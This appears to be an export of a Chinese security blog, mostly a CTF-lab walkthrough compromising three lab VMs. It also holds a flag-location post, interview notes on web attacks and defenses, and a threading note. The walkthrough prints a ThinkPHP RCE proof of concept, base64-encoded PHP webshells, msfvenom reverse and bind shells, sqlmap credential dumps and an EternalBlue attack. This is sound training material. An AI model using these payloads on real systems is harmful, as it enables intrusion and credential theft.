[{"title":"【Python Threading学习笔记】什么是多线程？","url":"/year/1901031-202253.html","content":"多线程类似于同时执行多个不同程序，比如一个很大的数据，直接运行的话可能需要10秒钟才能运行完。\n<!--more-->\n但如果使用Threading或者说使用多线程，我们把数据分成5段，每一段数据都放到一个单独的线程里面运算，所有线程同时开始。\n\n这就好比原本一个工作只有一个人在做，但现在有了5个人同时在做，很明显可以大大的提高效率，节省时间。\n\n如果平时有用过IDM下载东西的小伙伴，在下载文件的时候可以打开显示细节，就可以看到多个线程同时下载，传输速度基本能达到本地带宽的最高速度，下图可以很直观的看到多个线程同时下载的过程。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Threading1.gif)\n\n>更多信息欢迎关注微信公众号：TeamsSix\n>参考文章：https://morvanzhou.github.io/tutorials/python-basic/threading","tags":["Python","多线程","学习笔记"],"categories":["学习笔记"]},{"title":"【续】CFS三层靶机中的Flag位置及其获取","url":"/year/191021-213828.html","content":"# 0x00 前言\n最近写了一篇《CFS三层靶机搭建及其内网渗透》的文章，里面满满的干货，本篇文章需要结合《CFS三层靶机搭建及其内网渗透》一起看，这篇文章可以在本文底部找到阅读链接。\n<!--more-->\n# 0x01 Target1\n1、系统根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag1.png)\n\n2、网站根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag2.png)\n\n3、网站robots.txt文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag3.png)\n\n# 0x02 Target2\n1、系统根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag4.png)\n\n2、日志文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag5.png)\n\n3、passwd文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag6.png)\n\n4、crontab文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag7.png)\n\n5、网站根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag8.png)\n\n6、管理后台中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag9.png)\n\n# 0x03 Target3\n1、通过meterpreter上传Everything工具并安装\n\n```\nmeterpreter > upload ./Everything_64.exe C:\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag10.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag11.png)\n\n2、利用Everything，直接搜索flag文件\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag12.png)\n\n3、找到两处flag，继续找寻发现计划任务中存在第三处flag\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag13.png)\n\n4、最后一处在事件日志的注册表中被找到\n\n```\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Eventlog\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag14.png)\n\n>《CFS三层靶机搭建及其内网渗透》文章地址：\n>1、首发地址：https://www.anquanke.com/post/id/187908\n>2、博客地址：https://www.teamssix.com/year/191021-211425.html\n>更多信息欢迎关注我的公众号：TeamsSix","tags":["内网渗透","CFS","比赛"],"categories":["实例演示"]},{"title":"CFS三层靶机搭建及其内网渗透【附靶场环境】","url":"/year/191021-211425.html","content":">本文首发地址：https://www.anquanke.com/post/id/187908\n# 0x00 前言\n最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。\n<!--more-->\n在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。\n# 0x01 环境搭建\n简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png)\n图 1\n\nVmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png)\n图 2\n\n如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。\n>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。\n# 0x02 Target1\n## a、获取shell\n1、先用nmap扫描一下Target1\n```\nroot@kali:~# nmap -T4 -O 192.168.1.11\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT\nNmap scan report for 192.168.1.11\nHost is up (0.00042s latency).\nNot shown: 994 filtered ports\nPORT     STATE  SERVICE\n20/tcp   closed ftp-data\n21/tcp   open   ftp\n22/tcp   open   ssh\n80/tcp   open   http\n888/tcp  open   accessbuilder\n8888/tcp open   sun-answerbook\nMAC Address: 00:0C:29:81:A6:6D (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.10 - 4.11\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.97 seconds\n```\n可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。\n\n2、既然存在http服务，那就用浏览器打开看看是个什么\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png)\n3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下\n```\n/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png)\n4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png)\n5、在工具中命令是可以被执行的，那就getshell吧\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png)\n6、昂~ getshell失败，没关系，直接echo写入一句话\n```\necho \"<?php @eval($_POST['TeamsSix']);?>\" > shell.php\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png)\n7、通过浏览器访问，查看shell.php是否上传成功\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png)\n8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png)\n```\n之前：<?php @eval($_POST['TeamsSix']);?>\n之后：<?php @eval(['TeamsSix']);?>\n```\n\n9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试\n```\necho \"PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==\" | base64 -d > shell.php\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png)\n10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png)\n## b、设置代理\n>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。\n\n1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件\n```\nroot@kali:~# ifconfig\nroot@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf >shell.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png)\n2、在kali中配置运行监听模块\n```\nroot@kali:~# msfconsole\nmsf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > set lhost 0.0.0.0\nmsf5 exploit(multi/handler) > set lport 6666\nmsf5 exploit(multi/handler) > options\nmsf5 exploit(multi/handler) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png)\n3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行\n```\n(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf\n(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png)\n4、此时MSF获取到shell，通过meterpreter添加第二层的路由\n```\nrun autoroute -s 192.168.22.0/24\nrun autoroute -p\n\n这一步也可以使用run post/multi/manage/autoroute自动添加路由\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png)\n5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4\n```\nmsf5 > use auxiliary/server/socks4a\nmsf5 auxiliary(server/socks4a) > set srvport 2222\nmsf5 auxiliary(server/socks4a) > options\nmsf5 auxiliary(server/socks4a) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png)\n6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理\n```\nroot@kali:~# vim /etc/proxychains.conf\n加入以下内容：\nsocks4 \t192.168.1.113 \t2222\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png)\n7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置\n```\nroot@kali:~# proxychains4 nmap -Pn -sT 192.168.22.22\n-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。\n-sT：扫描TCP数据包已建立的连接connect\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png)\n# 0x03 Target2\n## a、获取shell\n1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png)\n2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png)\n3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧\n```\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png)\n4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库\n```\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword --dbs\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png)\n5、看看bagecms下有哪些表\n```\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword -D bagecms --tables\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png)\n6、看一下bage_admin下的内容\n```\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword -D bagecms -T bage_admin --columns\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png)\n7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行\n```\nroot@kali:~# proxychains4 sqlmap -u \"http://192.168.22.22/index.php?r=vul&keyword=1\" -p keyword -D bagecms -T bage_admin -C username,password --dump\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png)\n8、找到我们想要的了，登陆后台，看看有哪些功能\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png)\n9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png)\n10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png)\n## b、设置代理\n1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门\n```\nroot@kali:~# msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf > shell2.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png)\n2、利用蚁剑将shell2.elf上传到Target2并开启监听\n```\n(www:/www/wwwroot/upload) $ chmod 777 shell2.elf\n(www:/www/wwwroot/upload) $ ./shell2.elf\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png)\n\n3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。\n```\nmsf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp\nmsf5 exploit(multi/handler) > set RHOST 192.168.22.22\nmsf5 exploit(multi/handler) > set LPORT 4321\nmsf5 exploit(multi/handler) > options\nmsf5 exploit(multi/handler) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png)\n4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可\n```\nrun autoroute -s 192.168.33.0/24\nrun autoroute -p\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png)\n5、尝试扫描Target3\n```\nroot@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png)\n# 0x03 Target3\n## a、获取shell\n1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试\n```\nmsf5 > use exploit/windows/smb/ms17_010_psexec\nmsf5 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/bind_tcp\nmsf5 exploit(windows/smb/ms17_010_psexec) > set RHOST 192.168.33.33\nmsf5 exploit(windows/smb/ms17_010_psexec) > options\nmsf5 exploit(windows/smb/ms17_010_psexec) > run\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png)\n\n2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序\n```\nmeterpreter > shell\nC:\\Windows\\system32>net user\nC:\\Windows\\system32>net user Administrator 123\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png)\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png)\n# 0x04 总结\n到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。\n这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：\n\n1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看\n2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的\n3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功\n4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可\n5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功\n6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的\n7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌\n\n>参考文章：\n>http://zerlong.com/512.html\n>https://www.anquanke.com/post/id/170649\n>https://www.anquanke.com/post/id/164525\n>https://blog.csdn.net/qq_36711453/article/details/84977739\n>这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。\n\n>更多信息欢迎关注我的公众号：TeamsSix\n>本文首发地址：https://www.anquanke.com/post/id/187908","tags":["内网渗透","CFS","比赛"],"categories":["实例演示"]},{"title":"经过一场面试，我发现我还存在这些不足","url":"/year/191014-090745.html","content":"\n# 0x00 前言\n最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。\n\n这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。\n<!--more-->\n\nPS：\n\n1、面试中有的问题现在已经记得不是很深刻了，所以我想起来多少就记录多少咯。\n\n2、因为引用的文章内容都比较多，所以本文只提到了一些概念性的东西，关于每个知识点具体的详情有想看的小伙伴就自己在参考资料里面去找吧，嘿嘿 [狗头保命]\n\n# 0x01 SSRF和CSRF的概念以及区别\n这个知识点就属于以前有了解，但是平时很少接触以至于遗忘的类型，同时在笔试的时候就有提到这个点，笔试结束后我还特意查了一下，但是面试的时候却没有答上来，有点尴尬，下面就引用CSDN和知乎里两篇文章的描述，此处引用的文章地址为本文参考资料1和2。\n\n## CSRF\nCSRF又称跨站请求伪造，XSS就是CSRF中的一种。二者区别是XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。\n\n简单来说，CSRF是通过第三方网站伪装成正常用户登录目标网站，并以正常用户的身份对用户账号进行操作，以达到目的，CSRF攻击原理流程如下图。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi1.png)\n\n防御：\n\n1、增加验证码机制，增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过。\n\n2、验证referer,采用同源政策，referer记录着数据包的来源地址，来判断请求的合法性，但是这个可以伪造。\n\n3、使用Token，令牌是一种将表单value的加密算法生成不同的加密结果，在服务器端进行验证。\n\n4、在访问登录过一个网站，点击退出账户。\n\n总结：\n\n一次CSRF攻击成功实施，至少需要4个条件：\n\n1、被害用户已经进行过WEB身份认证，并留有Cookie\n\n2、新提交的请求无需重新进行身份认证或确认机制\n\n3、攻击者了解WEB请求的参数构造\n\n4、通过社交工程学诱使用户触发攻击的指令\n\n## SSRF\nSSRF又名服务端请求伪造攻击，如果把CSRF理解成客户端伪造请求攻击，它是利用用户本地的Cookie骗过服务器端的验证达到目的，而SSRF则是利用服务器天然能够访问内部网络的特点，进行攻击。\n\n由此可以得出，SSRF的受害对象主要是一些服务器所连接的一些内网设备，如内网的应用程序，通过file协议获得内部网络的资料等。SSRF攻击常见于一些允许以URL作为参数，且未对URL进行过滤的服务器。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi2.png)\n\n如上图，若URL是正常的第三方服务器，则URL会过滤通过。若URL是带有命令操作的服务器端A，且绕过了服务器端A的过滤，则服务器端A会执行URL带有的命令，并将结果返回会客户端，由此一次SSRF攻击成功。\n\n防御：\n\n从以上我们可以得出，该漏洞产生的原因是由于服务端对资源进行请求的时候对URL的验证出现了纰漏，所以我们的防护策略主要是围绕URL的过滤。\n\n1、将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。\n\n2、建立URL白名单，只允许白名单上内容通过过滤。\n\n3、建立内网IP黑名单，阻止对该IP的请求。\n\n4、对返回内容进行过滤，减少敏感内容暴露。\n\n5、禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。\n\n总结：\n\n一次成功的SSRF需要2个条件：\n\n1、攻击者知道服务器端的内网地址\n\n2、服务器端未对请求URL进行过滤或过滤不完全\n\n# 0x02 SQL注入的类型以及防御\n## 类型\n这里采用看雪的一篇文章，此处引用的文章地址为本文参考资料3。\n\n1、常见的sql注入按照参数类型可分为两种：数字型和字符型。\n\n \n\n当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。\n\n \n\n2、也可以根据数据库返回的结果，分为三种：回显注入、报错注入、盲注。\n\n \n\n回显注入：可以直接在存在注入点的当前页面中获取返回结果。\n\n \n\n报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。\n\n \n\n盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。\n\n \n\n3、按照注入位置及方式不同分为以下几种：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。\n\n## 防御\n这里采用知乎上的一个问答，此处引用的文章地址为本文参考资料4。\n\n问：\n\n如何从根本上防止 SQL 注入？\n\nSQL注入导致的安全问题数不胜数，为什么这么多年来同样的问题一再发生？\n\n如果是因为SQL脚本拼接的原因，为什么不在新的实现中采用api调用的方式来杜绝漏洞？\n\n答：\n\nSQL注入并不是一个在SQL内不可解决的问题，这种攻击方式的存在也不能完全归咎于SQL这种语言，因为注入的问题而放弃SQL这种方式也是因噎废食。首先先说一个我在其他回答中也曾提到过的观点：**没有（运行时）编译，就没有注入。**\n\nSQL注入产生的原因，和栈溢出、XSS等很多其他的攻击方法类似，就是未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。针对于SQL注入，则是用户提交的数据，被数据库系统编译而产生了开发者预期之外的动作。也就是，SQL注入是用户输入的数据，在拼接SQL语句的过程中，超越了数据本身，成为了SQL语句查询逻辑的一部分，然后这样被拼接出来的SQL语句被数据库执行，产生了开发者预期之外的动作。\n\n所以从根本上防止上述类型攻击的手段，还是避免数据变成代码被执行，时刻分清代码和数据的界限。而具体到SQL注入来说，被执行的恶意代码是通过数据库的SQL解释引擎编译得到的，所以只要**避免用户输入的数据被数据库系统编译**就可以了。\n\n至于如何避免用户输入的数据被数据库系统编译，我觉着可以参考CSDN上的一篇文章，详见本文参考资料5，该文具体说了以下内容：\n\n1、escape处理\n\n2、使用预编译语句\n\n3、使用存储过程\n\n4、检查数据类型\n\n5、使用安全函数\n\n# 0x03 XXE攻击的概念\n这个我不确定当时面试有没有问，不过刚才突然想到了，而且自己对XXE攻击也不是很了解，所以就简单记一下吧，此处引用的文章地址为本文参考资料6。\n\n在介绍xxe漏洞前，先学习温顾一下XML的基础知识。\n\nXML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。\n\n由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。\n\n文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。\n\n实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体根据引用方式，还可分为内部实体与外部实体，xxe漏洞主要是利用了DTD引用外部实体导致的漏洞。\n\nXXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。如果是linux下，可以读取/etc/passwd等目录下敏感数据。\n\nXXE的漏洞检测：\n\n1、检测XML是否会被成功解析\n\n2、检测服务器是否支持DTD引用外部实体，如果支持引用外部实体，那么很有可能是存在xxe漏洞的。\n\nXXE的修复与防御：\n\n1、使用开发语言提供的禁用外部实体的方法\n\n2、过滤用户提交的XML数据\n\n# 0x04 DDOS的类型\n说到DDOS，我的第一反应就是TCP SYN泛洪攻击，对于其他的类型却了解很少，所以这里也同样记录一下，此处引用的文章地址为本文参考资料7。\n\n首先有两类最常见的 DDoS 攻击，一是资源耗尽型；二是导致异常型，接下来就概要的说一下。\n\n1、SYN Flood攻击即洪水攻击是通过TCP建立3次握手连接的漏洞产生，主要通过发送源IP虚假的SYN报文，使目标主机无法与其完成3次握手，因而占满系统的协议栈队列，致使资源得不到释放，进而达成拒绝服务的目的，SYN Flood攻击是移动互联网中DDoS攻击最主要的形式之一。\n\n2、ACK Flood是对虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如SYN Flood。属于原始方式的DDoS攻击。 \n\n3、UDP Flood是使用原始套接字伪造大量虚假源IP的UDP包，主要以DNS协议为主。 \n\n4、ICMP Flood 即Ping攻击，是一种比较古老的方式。\n\n5、CC攻击即ChallengeCollapsar挑战黑洞，主要通过大量的肉鸡或者寻找匿名代理服务器，模拟真实的用户向目标发起大量的访问请求，导致消耗掉大量的并发资源，使网站打开速度慢或拒绝服务。现阶段CC攻击是应用层攻击方式之一。 \n\n6、DNS Flood主要是伪造海量的DNS请求，用于掩盖目标的DNS服务器。 \n\n7、慢速连接攻击是针对HTTP协议，以slowloris攻击为起源，然后建立HTTP连接，设置一个较大的传输长度，实际每次发送很少字节，让服务器认为HTTP头部没有传输完成，因此数据传输越多就会造成连接资源耗尽。 \n\n8、DOS攻击利用一些服务器程序的bug、安全漏洞、和架构性缺陷，然后通过构造畸形请求发送给服务器，服务器因不能判断处理恶意请求而瘫痪，造成拒绝服务。 \n\n# 0x05 跨域请求的概念\n以前记得在哪里有看到过这个，但是现在已经忘的差不多了，因此再复习复习，此处引用的文章地址为本文参考资料8。\n\n同源是指相同的协议、域名、端口，三者都相同才属于同源。同源策略浏览器出于安全考虑，在全局层面禁止了页面加载或执行与自身来源不同的域的任何脚本，站外其他来源的脚本同页面的交互则被严格限制。\n\n跨域由于浏览器同源策略，凡是发送请求url的协议、域名、端口三者之间任意一与当前页面地址不同即为跨域。\n\n看看哪些情况下属于跨域访问：\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png)\n\n# 0x06 Linux的日志文件位置\n讲道理，在面试前几天我在搭建一个三层靶机的环境，当时还查过Linux的日志文件位置的文章，但是在面试的时候却忘掉了，这就有点难受了，所以再记录一下吧，此处引用的文章地址为本文参考资料9。\n\n```\n/var/log/messages   ：常规日志消息\n/var/log/boot       ：系统启动日志\n/var/log/debug      ：调试日志消息\n/var/log/auth.log   ：用户登录和身份验证日志\n/var/log/daemon.log ：运行squid，ntpd等其他日志消息到这个文件\n/var/log/dmesg      ：Linux内核环缓存日志\n/var/log/dpkg.log   ：所有二进制包日志都包括程序包安装和其他信息\n/var/log/faillog    ：用户登录日志文件失败\n/var/log/kern.log   ：内核日志文件\n/var/log/lpr.log    ：打印机日志文件\n/var/log/mail.*     ：所有邮件服务器消息日志文件\n/var/log/mysql.*    ：MySQL服务器日志文件\n/var/log/user.log   ：所有用户级日志\n/var/log/xorg.0.log ：X.org日志文件\n/var/log/apache2/*  ：Apache Web服务器日志文件目录\n/var/log/lighttpd/* ：Lighttpd Web服务器日志文件目录\n/var/log/fsck/*     ：fsck命令日志\n/var/log/apport.log ：应用程序崩溃报告/日志文件\n/var/log/syslog     ：系统日志\n/var/log/ufw        ：ufw防火墙日志\n/var/log/gufw       ：gufw防火墙日志\n```\n# 0x07 Linux的各目录含义\n这个是以前大一大二的时候学的了，现在只记住了平时经常用的那几个目录，所以当时感觉回答的并不是很好，因此这里也简单记录一下，此处引用的文章地址为本文参考资料10。\n\n```\n/bin   重要的二进制 (binary) 应用程序\n/boot  启动 (boot) 配置文件\n/dev   设备 (device) 文件\n/etc   配置文件、启动脚本等 (etc)\n/home  本地用户主 (home) 目录\n/lib   系统库 (libraries) 文件\n/media 挂载可移动介质 (media)\n/mnt   挂载 (mounted) 文件系统\n/opt   提供一个供可选的 (optional) 应用程序安装目录\n/proc  特殊的动态目录\n/root  root (root) 用户主文件夹，读作“slash-root”\n/sbin  重要的系统二进制 (system binaries) 文件\n/srv   服务（serve）文件\n/sys   系统 (system) 文件\n/tmp   临时(temporary)文件\n/usr   包含绝大部分所有用户(users)都能访问的应用程序和文件\n/var   经常变化的(variable)文件，诸如日志或数据库等\n```\n# 0x08 总结\n暂时印象较深的也就想到这些了，说实话，虽然看着这篇文章记下了很多东西，但是我感觉自己脑子里还是没有记住多少东西，这些东西还是要经常去用才能记得住呀，平时不去用不去碰真的太容易忘了。通过这次面试也认识到自己的很多不足，所以不管最后面试结果怎么样，自己有收获就好，毕竟就像新东方唐叔说的：能力的提升不在于你做了多少道题，而在于你做了多少总结。\n\n我觉着这句话再衍生一下就是能力的提升在于总结两个字，也就是说我自己犯了这些错误，有没有去总结，如果总结又总结了多少？而我觉着这些总结正是单属于我自己的宝贵财富，好了，不瞎扯了，感觉马上都变成鸡汤了 [ 笑哭 